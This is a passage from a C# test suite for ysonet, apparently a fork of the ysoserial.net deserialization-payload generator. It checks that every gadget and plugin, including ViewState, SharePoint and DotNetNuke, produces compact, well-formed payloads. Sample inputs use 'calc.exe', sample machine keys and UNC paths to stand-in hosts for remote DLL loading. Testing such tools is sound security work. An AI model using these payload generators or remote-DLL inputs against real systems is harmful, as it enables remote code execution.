                AssertTrue(lz4.Success && RawLength(lz4.Raw) > 0,
                    gadget + " MessagePackTypelessLz4 generates: " + lz4.ErrorMessage);
            }
        }

        // Byte length of a raw payload whether it is a string or a byte[].
        private static int RawLength(object raw)
        {
            string s = raw as string;
            if (s != null) return s.Length;
            byte[] b = raw as byte[];
            if (b != null) return b.Length;
            return 0;
        }

        // Locks the DataSetOldBehaviourFromFile --compressed option (GZip-in-payload). The
        // compressed payload must be smaller than the plain inline-byte-array form AND carry the
        // GZipStream decompress chain that reconstitutes the assembly at deserialization time.
        // End-to-end execution of the compressed payload is covered by PayloadsFireIntoTestSinks.
        private static void DataSetFromFileCompressedIsSmaller()
        {
            string cs = WriteTestArtifact("ysonet_dsff_compress_fixture.cs",
                "public class YsonetCompressFixture { public YsonetCompressFixture() { } }");
            try
            {
                byte[] plain = GenerateDsffFromFile(cs, false);
                byte[] compressed = GenerateDsffFromFile(cs, true);
                AssertTrue(plain != null && plain.Length > 0, "uncompressed DataSetFromFile generates");
                AssertTrue(compressed != null && compressed.Length > 0, "compressed DataSetFromFile generates");
                AssertTrue(compressed.Length < plain.Length,
                    "compressed payload is smaller (" + compressed.Length + " vs " + plain.Length + " bytes)");
                AssertTrue(BytesContainAscii(compressed, "GZipStream"),
                    "compressed payload carries the GZipStream decompress chain");
                AssertTrue(!BytesContainAscii(plain, "GZipStream"),
                    "the plain payload does not use GZipStream");
            }
            finally { try { File.Delete(cs); } catch { } }
        }

        // Generate a DataSetOldBehaviourFromFile BinaryFormatter payload from a .cs file,
        // optionally with --compressed. Returns the raw bytes (null on failure).
        private static byte[] GenerateDsffFromFile(string csPath, bool compressed)
        {
            InputArgs ia = new InputArgs();
            ia.Cmd = csPath;
            ia.Minify = true;
            if (compressed) ia.ExtraArguments = new List<string> { "--compressed" };
            GenerationRequest req = new GenerationRequest
            {
                GadgetName = "DataSetOldBehaviourFromFile",
                FormatterName = "BinaryFormatter",
                OutputFormat = "",
                InputArgs = ia,
            };
            RunResult r = PayloadRunner.GenerateGadget(req);
            return r.Success ? (r.Raw as byte[]) : null;
        }

        // True if the ASCII bytes of `needle` appear anywhere in `hay` (the XAML inside a BF blob
        // is stored as ASCII, so its element names are byte-searchable without decoding the blob).
        private static bool BytesContainAscii(byte[] hay, string needle)
        {
            if (hay == null) return false;
            byte[] n = Encoding.ASCII.GetBytes(needle);
            for (int i = 0; i + n.Length <= hay.Length; i++)
            {
                bool ok = true;
                for (int j = 0; j < n.Length; j++) { if (hay[i + j] != n[j]) { ok = false; break; } }
                if (ok) return true;
            }
            return false;
        }

        // Locks the compact byte-array encoding. An inline byte array in XAML/XmlSerializer used
        // to spend "<s:Byte>N</s:Byte>" (19 chars) per byte; declaring the System namespace as
        // the default on the array lets each element be the bare "<Byte>N</Byte>" (15 chars),
        // saving 4 bytes per array element. On payloads that embed a whole assembly that is
        // several KB. XmlByteArrayEncoder is the shared helper; here we lock the tag it emits.
        private static void ByteArrayEncoderEmitsBareTag()
        {
            byte[] b = new byte[] { 1, 2, 255 };
            string bare = XmlByteArrayEncoder.ConvertBytesToArrayOfUnsignedByteXML(b, "Byte", "", "");
            AssertEqual("<Byte>1</Byte><Byte>2</Byte><Byte>255</Byte>", bare, "encoder emits the compact bare <Byte> tag");
            // The prefixed form must still be available for callers that need it.
            string prefixed = XmlByteArrayEncoder.ConvertBytesToArrayOfUnsignedByteXML(b, "s:Byte", "", "");
            AssertEqual("<s:Byte>1</s:Byte><s:Byte>2</s:Byte><s:Byte>255</s:Byte>", prefixed, "encoder still supports a prefixed tag");
        }

        // Locks the compact byte array in the GetterSettingsPropertyValue Xaml payload (the
        // tool's largest payload): bare <Byte> children under an <assembly:Array> that declares
        // the System namespace as its default, instead of an "s:" prefix on every byte. The
        // command is only a string here; generation never executes it. The end-to-end firing is
        // covered by the FULL PayloadsFireIntoTestSinks matrix.
        private static void GspvXamlUsesCompactByteArray()
        {
            // Lock the byte encoding on the un-minified form, where the exact tags are stable
            // (the minifier renames the "s"/"assembly" prefixes, so assert those there instead).
            string xaml = GenerateGspvXaml(false);
            AssertTrue(!string.IsNullOrEmpty(xaml), "gspv Xaml is a non-empty string");
            AssertTrue(xaml.IndexOf("<Byte>", StringComparison.Ordinal) >= 0,
                "gspv uses the bare <Byte> element (compact form)");
            AssertTrue(xaml.IndexOf("<s:Byte>", StringComparison.Ordinal) < 0,
                "gspv no longer uses the wasteful <s:Byte> prefix on every byte");
            AssertTrue(xaml.IndexOf("Type=\"s:Byte\" xmlns=\"clr-namespace:System;assembly=mscorlib\"", StringComparison.Ordinal) >= 0,
                "the byte array declares the System namespace as its default so bare <Byte> resolves");
            AssertTrue(XmlWellFormednessError(xaml) == null, "gspv Xaml stays well-formed XML");
        }

        // Locks the GetterSettingsPropertyValue Xaml minify. The un-minified form emits the whole
        // BinaryFormatter payload as a per-byte <Byte> array (tens of KB). The minified form drops
        // that array entirely and passes the payload as a base64 STRING in SerializedValue, with
        // the owning SettingsProperty marked SerializeAs="Binary"; SettingsPropertyValue then does
        // Convert.FromBase64String + BinaryFormatter.Deserialize itself. That is a ~90% cut. The
        // minified payload must be far smaller, stay well-formed, carry no <Byte> array, use the
        // base64-string + SerializeAs=Binary shape, and the base64 must decode to a real
        // BinaryFormatter stream. Firing the minified payload is covered in PayloadsFireIntoTestSinks.
        private static void GspvXamlMinifies()
        {
            string plain = GenerateGspvXaml(false);
            string min = GenerateGspvXaml(true);
            AssertTrue(!string.IsNullOrEmpty(plain) && !string.IsNullOrEmpty(min), "gspv Xaml generates both ways");
            AssertTrue(min.Length < plain.Length / 2,
                "gspv Xaml minify is a large cut (" + min.Length + " << " + plain.Length + ")");
            AssertTrue(XmlWellFormednessError(min) == null, "minified gspv Xaml is well-formed");
            // The per-byte array (present un-minified) is gone; a single base64 string replaces it.
            AssertTrue(plain.IndexOf("<Byte>", StringComparison.Ordinal) >= 0,
                "sanity: the un-minified form uses the per-byte <Byte> array");
            AssertTrue(min.IndexOf("<Byte>", StringComparison.Ordinal) < 0,
                "the minified form drops the per-byte <Byte> array");
            AssertTrue(min.IndexOf("SerializeAs=\"Binary\"", StringComparison.Ordinal) >= 0,
                "the minified form marks SettingsProperty SerializeAs=Binary so the base64-string path runs");
            // Integrity: pull the SerializedValue string back out and prove it is the real
            // BinaryFormatter payload (magic header 00 01 00 00 00 FF FF FF FF), not garbage. A
            // truncated or mangled array would fail this even if the XML stayed well-formed.
            const string open = ".SerializedValue><s:String>";
            int a = min.IndexOf(open, StringComparison.Ordinal);
            AssertTrue(a >= 0, "the minified form passes SerializedValue as a base64 string");
            a += open.Length;
            int b = min.IndexOf("</s:String>", a, StringComparison.Ordinal);
            AssertTrue(b > a, "the base64 SerializedValue string is terminated");
            byte[] bf = Convert.FromBase64String(min.Substring(a, b - a));
            byte[] head = new byte[] { 0, 1, 0, 0, 0, 255, 255, 255, 255 };
            bool okHead = bf.Length > head.Length;
            for (int i = 0; okHead && i < head.Length; i++) if (bf[i] != head[i]) okHead = false;
            AssertTrue(okHead, "the SerializedValue base64 decodes to a BinaryFormatter stream");
        }

        // Generate a GetterSettingsPropertyValue Xaml payload as a string (command is a value
        // only; generation never runs it).
        private static string GenerateGspvXaml(bool minify)
        {
            InputArgs ia = new InputArgs();
            ia.Cmd = "calc.exe";
            ia.Minify = minify;
            RunResult r = PayloadRunner.GenerateGadget(new GenerationRequest
            {
                GadgetName = "GetterSettingsPropertyValue",
                FormatterName = "Xaml",
                OutputFormat = "",
                InputArgs = ia,
            });
            AssertTrue(r.Success, "gspv Xaml generates: " + r.ErrorMessage);
            return r.Raw as string;
        }

        // Every gadget must actually produce a non-empty payload from valid inputs,
        // not merely declare that it supports a formatter. Data-driven, so a newly
        // added gadget is covered automatically. For each gadget it picks a sample
        // input matching the gadget's declared CommandInput() and generates with the
        // gadget's first supported formatter. (The CLI's --raf sweeps every formatter;
        // this is the per-gadget smoke test that each one can generate at all.)
        private static void EveryGadgetGeneratesAPayload()
        {
            // Fixtures for the file/dll/source input types.
            string csFixture = WriteTestArtifact("ysonet_gadget_fixture.cs",
                "public class YsonetTestFixture { public YsonetTestFixture() { } }");
            // A real managed PE for gadgets that embed a DLL to load on the target.
            string dllFixture = new Uri(typeof(OptionSet).Assembly.CodeBase).LocalPath;
            // Text a gadget embeds in its payload (the write operation of
            // TypeConfuseDelegateFileOperations reads it at generation time).
            string contentFixture = ContentFixture();

            try
            {
                string[] names = GadgetRegistry.GetAllGadgetNames();
                AssertTrue(names.Length > 0, "found gadgets to generate");

                foreach (string name in names)
                {
                    // "Generic" is the base generator, not a real gadget (the CLI hides
                    // it too); it has no payload to produce.
                    if (name == "Generic") continue;

                    // A denial-of-service gadget is never built by an automatic sweep,
                    // so no test needs an acknowledgement to pass. The skip is derived
                    // from facets, never from a name list, and DosGadgetsAreContained
                    // proves the exclusion instead of leaving it to convention.
                    if (DosPolicy.IsDosGadget(name)) continue;

                    IGenerator g = GadgetRegistry.CreateGadgetInstance(name);
                    AssertTrue(g != null, "gadget loads: " + name);

                    List<string> formatters = g.SupportedFormatters();
                    AssertTrue(formatters != null && formatters.Count > 0, name + " declares a formatter");

                    // SupportedFormatters() entries may carry display annotations
                    // ("Xaml (4)", "YamlDotNet < 5.0.0"); the real -f name is the first
                    // whitespace-delimited token (see GenericGenerator.IsSupported).
                    string formatter = formatters[0].Split(' ')[0];

                    InputArgs ia = new InputArgs();
                    ia.Cmd = SampleInputForGadget(g.CommandInput(), csFixture, dllFixture, contentFixture);

                    GenerationRequest req = new GenerationRequest
                    {
                        GadgetName = name,
                        FormatterName = formatter,
                        OutputFormat = "",
                        InputArgs = ia,
                    };

                    RunResult r = PayloadRunner.GenerateGadget(req);
                    AssertTrue(r.Success, "generate " + name + " (-f " + formatter + "): " + r.ErrorMessage);
                    AssertTrue(!RawIsEmpty(r.Raw), "non-empty payload for " + name + " (-f " + formatter + ")");
                }
            }
            finally
            {
                try { File.Delete(csFixture); } catch { }
                try { File.Delete(contentFixture); } catch { }
            }
        }

        // A valid sample input for a gadget's declared command-input type. Nothing here
        // reaches the network, nothing is created on this machine, and file/dll/source
        // inputs point at local fixtures.
        //
        // The three target-path forms use names beginning with 'z' on purpose. A gadget
        // built on the sorted-container primitive requires its FIRST argument to sort
        // strictly after its second with String.CompareOrdinal (see
        // TypeConfuseDelegateFileOperations), so the sample target path has to sort above
        // both the sample destination ("aa...") and the content fixture's text ("AAA...").
        // Never resolved, never opened: a UNC sample is target data. The host name is
        // deliberately one that cannot exist, so a sweep can never call out.
        private const string SampleUncPath = @"\\ysonet-nonexistent-host\share\payload.dll";

        private const string SampleTargetPath = "zz_ysonet_target.txt";
        private const string SampleTargetPathPair = "zz_ysonet_source.txt;aa_ysonet_destination.txt";

        // The text of ContentFixture(): deliberately starts with a high-sorting-below
        // 'A' so any 'z' target path sorts after it ordinally.
        private const string SampleContentFixtureText =
            "AAA ysonet content fixture\r\nsecond line\r\n";

        private static string ContentFixture()
        {
            return WriteTestArtifact("ysonet_content_fixture.txt", SampleContentFixtureText);
        }

        private static string SampleInputForGadget(CommandInputType t, string csFixture,
            string dllFixture, string contentFixture)
        {
            switch (t)
            {
                case CommandInputType.Ignored: return "";
                case CommandInputType.ShellCommand: return "calc.exe";
                case CommandInputType.Url: return "http://localhost/ysonet";
                case CommandInputType.FilePath: return csFixture;   // any existing local file
                case CommandInputType.CsSourceFile: return csFixture;
                case CommandInputType.DllPath: return dllFixture;
                // A UNC path is only ever TARGET data, so nothing needs to exist here. The
                // ".dll" tail keeps it valid for the assembly-loading gadgets too.
                case CommandInputType.UncPath: return SampleUncPath;
                case CommandInputType.TargetPath: return SampleTargetPath;
                case CommandInputType.TargetPathPair: return SampleTargetPathPair;
                case CommandInputType.TargetPathAndLocalFile:
                    return SampleTargetPath + ";" + contentFixture;
                default: return "calc.exe";
            }
        }

        // Reset a plugin's private static bool option flag so an in-process test is not
        // affected by a value a sibling test left behind (see note in the plugin sweep).
        private static void ResetStaticBool(Type t, string field)
        {
            var f = t.GetField(field, System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static);
            if (f != null && f.FieldType == typeof(bool)) f.SetValue(null, false);
        }

        private static bool RawIsEmpty(object raw)
        {
            if (raw == null) return true;
            byte[] b = raw as byte[];
            if (b != null) return b.Length == 0;
            string s = raw as string;
            if (s != null) return s.Length == 0;
            return false; // some other non-null object counts as produced
        }

        // Well-formedness check for a payload whose output is XML (soap, Net/DataContract,
        // XmlSerializer, XAML). Returns null when the payload is well-formed OR is not XML
        // output at all (binary, base64, JSON, YAML - those do not start with '<', so we skip
        // them); returns the parser error when the payload IS XML but does not parse. Used to
        // prove the minifier never produces malformed XML. Fragment conformance so a payload
        // that is a bare element (no XML declaration, as the minifier emits) is still accepted.
        private static string XmlWellFormednessError(object raw)
        {
            string text = raw as string;
            if (text == null && raw is byte[])
            {
                try { text = Encoding.UTF8.GetString((byte[])raw); } catch { return null; }
            }
            if (text == null) return null;
            text = text.Trim();
            if (text.Length > 0 && text[0] == (char)0xFEFF) text = text.Substring(1).Trim(); // drop a UTF-8 BOM
            if (text.Length == 0 || text[0] != '<') return null; // not XML output; nothing to check
            try
            {
                var settings = new System.Xml.XmlReaderSettings
                {
                    ConformanceLevel = System.Xml.ConformanceLevel.Fragment,
                    DtdProcessing = System.Xml.DtdProcessing.Ignore,
                };
                using (StringReader sr = new StringReader(text))
                using (System.Xml.XmlReader xr = System.Xml.XmlReader.Create(sr, settings))
                    while (xr.Read()) { }
                return null; // well-formed
            }
            catch (Exception ex) { return ex.Message; }
        }

        // Every plugin that can generate a payload offline must actually do so with
        // valid inputs. The remaining plugins are excluded explicitly with a reason.
        // A coverage guard fails if a plugin is neither generated nor excluded, so a
        // newly added plugin cannot silently skip this test.
        //
        // Plugins store parsed options in static fields, so runs are made deterministic
        // by passing the mode/format tokens each plugin relies on rather than trusting
        // defaults that an earlier run may have changed.
        private static void EverySafePluginGeneratesAPayload()
        {
            // Plugins keep parsed options in static fields and never reset them. In
            // production this is harmless (each ysonet.exe run is a fresh process), but
            // in-process a sibling test that runs ViewState with --examples leaves that
            // static flag on, which would block generation here. Clearing it keeps this
            // test order-independent. (Only ViewState's flag leaks across tests; every
            // other plugin below is run once with explicit tokens.)
            ResetStaticBool(typeof(ysonet.Plugins.ViewStatePlugin), "showExamples");

            // GetterCallGadgets reads its inner payload from a file (File.ReadAllText),
            // so it needs one that exists.
            string innerFixture = WriteTestArtifact("ysonet_plugin_inner.json", "{}");

            // Harmless hex keys (from the ViewState usage docs) for the crypto plugins.
            const string valKey = "70DBADBFF4B7A13BE67DD0B11B177936F8F3C98BCE2E0A4F222F7A769804D451ACDB196572FFF76106F33DCEA1571D061336E68B12CF0AF62D56829D2A48F1B0";
            const string decKey = "34C69D15ADD80DA4788E6E3D02694230CF8E9ADFDA2708EF43CAEF4C5BC73887";

            var argvByPlugin = new Dictionary<string, string[]>(StringComparer.OrdinalIgnoreCase)
            {
                { "Altserialization", new string[] { "-c", "calc.exe" } },
                { "ApplicationTrust", new string[] { "-c", "calc.exe" } },
                { "DotNetNuke", new string[] { "-m", "run_command", "-c", "calc.exe" } },
                { "GetterCallGadgets", new string[] { "-g", "PropertyGrid", "-i", innerFixture } },
                { "MachineKeySessionSecurityTokenHandler", new string[] { "-c", "calc.exe", "--validationkey", valKey, "--decryptionkey", decKey } },
                { "Resx", new string[] { "-M", "BinaryFormatter", "-c", "calc.exe" } },
                { "SessionSecurityTokenHandler", new string[] { "-c", "calc.exe" } },
                { "SharePoint", new string[] { "--cve", "CVE-2018-8421", "-c", "calc.exe" } },
                { "ThirdPartyGadgets", new string[] { "-g", "UnmanagedLibrary", "-f", "Json.NET", "-i", "\\\\host\\a.dll" } },
                { "TransactionManagerReenlist", new string[] { "-c", "calc.exe" } },
                { "ViewState", new string[] { "--dryrun", "--validationkey", valKey } },
                { "Xps", new string[] { "-m", "fdseq", "-c", "calc.exe" } },
            };

            // Not generated here, each with the reason. Keeping this explicit forces a
            // new plugin to be classified (see the coverage guard below).
            var excluded = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase)
            {
                { "ActivatorUrl", "makes a live remoting/network call and returns a status string, not a payload" },
                { "Clipboard", "writes the OS clipboard on an STA thread; covered by dedicated clipboard tests" },
                { "Generic", "base plugin type, not a real plugin" },
            };

            try
            {
                foreach (KeyValuePair<string, string[]> kv in argvByPlugin)
                {
                    RunResult r = PayloadRunner.RunPlugin(kv.Key, kv.Value);
                    AssertTrue(r.Success, "plugin " + kv.Key + " runs: " + r.ErrorMessage);
                    AssertTrue(!RawIsEmpty(r.Raw), "plugin " + kv.Key + " produced a non-empty payload");
                }

                // Coverage guard: every discovered plugin is generated or excluded.
                foreach (string name in PluginRegistry.GetAllPluginNames())
                {
                    bool known = argvByPlugin.ContainsKey(name) || excluded.ContainsKey(name);
                    AssertTrue(known, "plugin " + name + " has no generation test and no explicit exclusion (add one)");
                }
            }
            finally
            {
                try { File.Delete(innerFixture); } catch { }
            }
        }

        // ================= FULL tier: exhaustive combination suite =================
        // These five tests never run on a normal Debug build (see Main's tier gate).
        // They GENERATE every gadget/plugin combination and, where a test-owned sink
        // can observe the effect, EXECUTE the payload and prove it fires. Standing
        // safety rule held everywhere below: every command is self-closing or is a
        // value that is never executed; every listener is loopback-only; every fixture
        // is a temp file cleaned up. Nothing opens calc or leaves an app running.

        // ---- 6.1 shared helpers ----

        // Encode raw output (string or byte[]) to every output encoding and assert each
        // is well-formed AND decodes back to the source bytes, so PayloadRunner.Encode is
        // proven for both raw kinds without multiplying the whole gadget matrix. The
        // "source bytes" mirror what Encode itself works from: ASCII bytes for a string
        // (Encode's base64/hex string paths use Encoding.ASCII.GetBytes), the bytes
        // themselves for a byte[].
        private static void EncodeAndVerify(object raw, string label)
        {
            bool isString = raw is string;
            byte[] source = isString ? Encoding.ASCII.GetBytes((string)raw) : (byte[])raw;
            int len;

            // raw: the input unchanged (UTF8 bytes for a string, the bytes for a byte[]).
            byte[] rawOut = PayloadRunner.Encode(raw, "raw", out len);
            AssertTrue(rawOut != null, label + ": raw encode is non-null");
            if (isString)
                AssertEqual((string)raw, Encoding.UTF8.GetString(rawOut), label + ": raw round-trips a string");
            else
                AssertTrue(BytesEqual(source, rawOut), label + ": raw round-trips bytes");

            // base64 and base64-urlencode: reverse the url-escapes, then FromBase64String
            // must reproduce the source bytes.
            foreach (string fmt in new string[] { "base64", "base64-urlencode" })
            {
                byte[] outBytes = PayloadRunner.Encode(raw, fmt, out len);
                AssertTrue(outBytes != null && outBytes.Length > 0, label + ": " + fmt + " is non-empty");
                string s = Encoding.ASCII.GetString(outBytes);
                if (fmt.Contains("urlencode"))
                    s = s.Replace("%2B", "+").Replace("%2F", "/").Replace("%3D", "=");
                byte[] decoded = Convert.FromBase64String(s);
                AssertTrue(BytesEqual(source, decoded), label + ": " + fmt + " decodes back to raw");
            }

            // hex: an even-length [0-9A-Fa-f] string that parses back to the source bytes.
            byte[] hexOut = PayloadRunner.Encode(raw, "hex", out len);
            AssertTrue(hexOut != null && hexOut.Length > 0, label + ": hex is non-empty");
            string hex = Encoding.ASCII.GetString(hexOut);
            AssertTrue(hex.Length % 2 == 0 && IsHex(hex), label + ": hex is even-length hex digits");
            AssertTrue(BytesEqual(source, HexToBytes(hex)), label + ": hex decodes back to raw");

            // raw-urlencode: for a string it URL-decodes back to the string. For a byte[]
            // the transform is inherently lossy (UTF8.GetString over arbitrary bytes), so
            // only assert it is non-empty.
            byte[] ruOut = PayloadRunner.Encode(raw, "raw-urlencode", out len);
            AssertTrue(ruOut != null, label + ": raw-urlencode is non-null");
            if (isString)
            {
                string ru = Encoding.UTF8.GetString(ruOut)
                    .Replace("%2B", "+").Replace("%2F", "/").Replace("%3D", "=");
                AssertEqual((string)raw, ru, label + ": raw-urlencode round-trips a string");
            }
            else
            {
                AssertTrue(ruOut.Length > 0, label + ": raw-urlencode of bytes is non-empty");
            }
        }

        private static bool IsHex(string s)
        {
            foreach (char c in s)
                if (!((c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F')))
                    return false;
            return true;
        }

        private static byte[] HexToBytes(string hex)
        {
            byte[] b = new byte[hex.Length / 2];
            for (int i = 0; i < b.Length; i++)
                b[i] = Convert.ToByte(hex.Substring(i * 2, 2), 16);
            return b;
        }

        // Reset every private static bool option flag on a plugin type, so a flag one
        // cell set (test/minify/usesimpletype/...) cannot leak into the next in-process cell.
        private static void ResetPluginStatics(Type t)
        {
            if (t == null) return;
            foreach (var f in t.GetFields(System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static))
                if (f.FieldType == typeof(bool))
                    f.SetValue(null, false);
        }

        // --- Test artifact locations ------------------------------------------------
        // Every file a test writes (fixture, input, payload, marker, sink folder) goes to
        // the first writable directory in this chain: workspace-root "temp" (gitignored,
        // and the folder a maintainer can exclude from antivirus) -> %TEMP% ->
        // %SystemRoot%\Temp -> C:\temp. Antivirus sometimes deletes a generated payload or
        // a dropped marker as a false positive right after it is written, so a write is
        // verified and falls through to the next candidate. This changes only WHERE and how
        // robustly a file is written; it never loosens a behavioral assertion.
        // No machine path is ever hardcoded (CLAUDE.md, "No local artifacts in commits").

        private static string _artifactDir;

        // Candidate directories for test artifacts, most-preferred first. Enumeration is
        // kept separate from the filesystem probe below so the ordering can be tested
        // without touching disk, and every path is derived - no drive letter is hardcoded.
        private static IEnumerable<string> TestArtifactDirCandidates()
        {
            string ws = FindWorkspaceRoot();
            if (ws != null) yield return Path.Combine(ws, "temp");
            yield return Path.GetTempPath();
            string sysRoot = Environment.GetEnvironmentVariable("SystemRoot");
            if (!string.IsNullOrEmpty(sysRoot)) yield return Path.Combine(sysRoot, "Temp");
            // Last resort: a "temp" folder at the root of the system drive (normally
            // C:\temp), taken from the system path rather than assumed to be C:.
            string sysDrive = Path.GetPathRoot(string.IsNullOrEmpty(sysRoot) ? Environment.SystemDirectory : sysRoot);
            if (!string.IsNullOrEmpty(sysDrive)) yield return Path.Combine(sysDrive, "temp");
        }

        // Walk up from the test exe to the folder holding ysonet.sln. No hardcoded path.
        private static string FindWorkspaceRoot()
        {
            var dir = new DirectoryInfo(AppDomain.CurrentDomain.BaseDirectory);
            while (dir != null)
            {
                if (File.Exists(Path.Combine(dir.FullName, "ysonet.sln"))) return dir.FullName;
                dir = dir.Parent;
            }
            return null;
        }

        // The directory test artifacts live in: the first candidate that takes a probe
        // write. Resolved once per run, then reused so every test shares one location.
        private static string ResolveTestArtifactDir()
        {
            if (_artifactDir != null)
            {
                try { Directory.CreateDirectory(_artifactDir); return _artifactDir; }
                catch { _artifactDir = null; } // it vanished; pick again
            }

            var tried = new List<string>();
            foreach (string dir in TestArtifactDirCandidates())
            {
                if (string.IsNullOrEmpty(dir)) continue;
                tried.Add(dir);
                try
                {
                    Directory.CreateDirectory(dir);
                    string probe = Path.Combine(dir, "ysonet_probe_" + Guid.NewGuid().ToString("N") + ".tmp");
                    File.WriteAllText(probe, "x");
                    File.Delete(probe);
                    _artifactDir = dir;
                    return dir;
                }
                catch { /* try the next candidate */ }
            }
            throw new IOException("No writable test artifact directory found. Tried: " +
                string.Join(", ", tried));
        }

        // A path inside the artifact directory, for a file the TEST does not write itself:
        // a marker a payload will drop, an output file the tool writes, or a sink folder.
        private static string TestArtifactPath(string name)
        {
            return Path.Combine(ResolveTestArtifactDir(), name);
        }

        // Write a test artifact and confirm it survived (AV can delete it right away). On
        // failure or disappearance, fall through to the next candidate directory. Returns
        // the path written; the caller deletes it in a finally.
        private static string WriteTestArtifact(string fileName, string content)
        {
            return WriteArtifactIn(TestArtifactDirCandidates(), fileName, content, null);
        }

        // The write itself, over any candidate list. Split out so the fall-through, the
        // post-write disappearance case, and the final diagnostic can be tested with
        // made-up candidates instead of whatever this machine happens to have. `survived`
        // is the "is it still there?" check (File.Exists in real use), which a test
        // substitutes to stand in for antivirus deleting the file straight after the write.
        private static string WriteArtifactIn(IEnumerable<string> candidates, string fileName,
            string content, Func<string, bool> survived)
        {
            if (survived == null) survived = File.Exists;
            var tried = new List<string>();
            foreach (string dir in candidates)
            {
                if (string.IsNullOrEmpty(dir)) continue;
                tried.Add(dir);
                try
                {
                    Directory.CreateDirectory(dir);
                    string path = Path.Combine(dir, fileName);
                    File.WriteAllText(path, content);
                    if (survived(path)) return path; // survived AV
                }
                catch { /* try the next candidate */ }
            }
            throw new IOException("Could not create test artifact '" + fileName +
                "' in any temp location (AV may be deleting it). Tried: " +
                (tried.Count == 0 ? "(no candidates)" : string.Join(", ", tried)));
        }

        // Write a temp fixture and return its path; the caller deletes it in a finally.
        private static string MakeTempFile(string name, string content)
        {
            return WriteTestArtifact(name, content);
        }

        // Leftovers from an earlier run: mostly fire markers that the spawned
        // "cmd /c echo x > marker" re-creates a moment AFTER the test already deleted it,
        // plus whatever a crashed or killed run never cleaned up. They never cause a false
        // pass (every fire helper deletes its marker before firing), but they pile up, so
        // each run sweeps them once at startup.
        private static readonly TimeSpan StaleArtifactAge = TimeSpan.FromHours(1);

        private static void SweepStaleTestArtifacts()
        {
            int removed = 0;
            try
            {
                foreach (string dir in TestArtifactDirCandidates())
                    removed += SweepStaleArtifacts(dir, StaleArtifactAge);
            }
            catch { /* housekeeping only; never fail a run over it */ }
            if (removed > 0)
                Console.Error.WriteLine("[sweep] removed " + removed + " stale test artifact(s) from earlier runs");
        }

        // Delete the "ysonet_*" files and folders in dir last written more than olderThan
        // ago, and return how many went. Everything else is left alone. The age rule is what
        // makes this safe to run while a SECOND suite is live (a Debug build's post-build
        // tests next to a manual --full run): that run's files are seconds old, not hours.
        private static int SweepStaleArtifacts(string dir, TimeSpan olderThan)
        {
            if (string.IsNullOrEmpty(dir) || !Directory.Exists(dir)) return 0;

            string[] entries;
            try { entries = Directory.GetFileSystemEntries(dir, "ysonet_*"); }
            catch { return 0; }

            DateTime cutoff = DateTime.UtcNow - olderThan;
            int removed = 0;
            foreach (string entry in entries)
            {
                // "ysonet_payloads" / "ysonet_payloads.txt" is the wizard's DEFAULT output
                // name, so one could be a file the user asked for, not a test artifact.
                if (Path.GetFileName(entry).StartsWith("ysonet_payloads", StringComparison.OrdinalIgnoreCase))
                    continue;
                try
                {
                    if (Directory.Exists(entry))
                    {
                        if (Directory.GetLastWriteTimeUtc(entry) > cutoff) continue;
                        Directory.Delete(entry, true);
                    }
                    else
                    {
                        if (File.GetLastWriteTimeUtc(entry) > cutoff) continue;
                        File.Delete(entry);
                    }
                    removed++;
                }
                catch { /* in use, or denied: leave it for the next run */ }
            }
            return removed;
        }

        // The candidate chain is the whole point of the helpers, so lock its shape: the
        // workspace temp first, then the user temp, then the system Temp, then a temp at the
        // system-drive root. Everything is compared against values derived on THIS machine,
        // so the test carries no developer path and no assumed drive letter.
        private static void TestArtifactDirOrdering()
        {
            var chain = new List<string>(TestArtifactDirCandidates());
            AssertTrue(chain.Count >= 3, "the chain offers at least user temp, system Temp and the drive-root temp");

            string ws = FindWorkspaceRoot();
            AssertTrue(ws == null || File.Exists(Path.Combine(ws, "ysonet.sln")),
                "FindWorkspaceRoot returns the folder holding ysonet.sln, or null off-checkout");
            if (ws != null)
                AssertEqual(Path.Combine(ws, "temp"), chain[0], "the workspace temp is tried first");

            int i = ws == null ? 0 : 1;
            AssertEqual(Path.GetTempPath(), chain[i], "the user temp is next");

            string sysRoot = Environment.GetEnvironmentVariable("SystemRoot");
            if (!string.IsNullOrEmpty(sysRoot))
                AssertEqual(Path.Combine(sysRoot, "Temp"), chain[i + 1], "the system Temp is next");

            string last = chain[chain.Count - 1];
            string sysDrive = Path.GetPathRoot(string.IsNullOrEmpty(sysRoot) ? Environment.SystemDirectory : sysRoot);
            AssertEqual(Path.Combine(sysDrive, "temp"), last, "the last resort is a temp at the system-drive root");
            AssertTrue(last.StartsWith(sysDrive, StringComparison.OrdinalIgnoreCase),
                "the last resort drive is derived, not hardcoded");

            foreach (string dir in chain)
                AssertTrue(!string.IsNullOrEmpty(dir) && Path.IsPathRooted(dir), "every candidate is a rooted path");
        }

        // The write walks the chain: it skips a candidate it cannot create, it treats a file
        // that vanished right after the write (antivirus) as a miss and moves on, and when
        // nothing works it fails loudly naming every location it tried.
        private static void TestArtifactWriteFallsThrough()
        {
            string root = TestArtifactPath("ysonet_writefallthrough_test");
            SafeDeleteDir(root);
            Directory.CreateDirectory(root);
            try
            {
                // A FILE where a candidate directory should be: CreateDirectory throws, so
                // this candidate is skipped rather than taking the whole write down.
                string blocked = Path.Combine(root, "blocked");
                File.WriteAllText(blocked, "not a directory");
                string good = Path.Combine(root, "good");

                string written = WriteArtifactIn(new[] { blocked, good }, "ysonet_probe_fallthrough.txt", "x", null);
                AssertEqual(Path.Combine(good, "ysonet_probe_fallthrough.txt"), written,
                    "an unusable candidate is skipped and the next one is used");
                AssertTrue(File.Exists(written), "the artifact really exists at the returned path");

                // Antivirus case: the write succeeds, then the file is gone. The first
                // candidate must be abandoned even though nothing threw.
                string eaten = Path.Combine(root, "eaten");
                string second = Path.Combine(root, "second");
                Func<string, bool> avEatsTheFirst = delegate(string p)
                {
                    return !p.StartsWith(eaten, StringComparison.OrdinalIgnoreCase) && File.Exists(p);
                };
                string survivor = WriteArtifactIn(new[] { eaten, second }, "ysonet_probe_av.txt", "x", avEatsTheFirst);
                AssertEqual(Path.Combine(second, "ysonet_probe_av.txt"), survivor,
                    "a file that disappears after the write falls through to the next directory");

                // Nothing usable: a setup failure that names what was tried, never a skip.
                string missing = Path.Combine(root, "nope");
                string caught = null;
                try { WriteArtifactIn(new[] { blocked, missing }, "ysonet_probe_none.txt", "x", delegate { return false; }); }
                catch (IOException ex) { caught = ex.Message; }
